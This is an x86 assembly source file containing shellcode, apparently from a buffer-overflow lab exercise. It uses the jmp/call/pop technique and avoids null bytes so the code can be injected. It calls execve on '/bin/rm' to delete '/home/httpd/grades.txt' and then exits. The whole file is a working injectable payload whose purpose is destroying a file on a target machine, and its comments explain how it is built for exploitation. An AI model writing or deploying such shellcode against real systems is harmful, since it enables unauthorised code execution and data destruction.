#include <sys/syscall.h>

#define STRING	"/bin/rm"
#define PATH "b/home/httpd/grades.txt"
#define STRLEN	7
#define ARGV	((STRLEN+1))
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi, -0xc(%esp)	/* set up argv pointer to pathname */
        leal    0x8(%esi), %ecx
	movl    %ecx, -0x8(%esp)
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,0x7(%esi)	/* null-terminate our string */
	movb    %al,0x1e(%esi)
	movb    %al,0x1f(%esi)
	movl	%eax,-0x4(%esp)	/* set up null envp */

	movb	$SYS_execve,%al		/* syscall arg 1: syscall number */
	movl	%esi,%ebx		/* syscall arg 2: string pathname */
	leal	-0xc(%esp),%ecx		/* syscall arg 2: argv */
	leal	-0x4(%esp),%edx		/* syscall arg 3: envp */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
	.ascii PATH
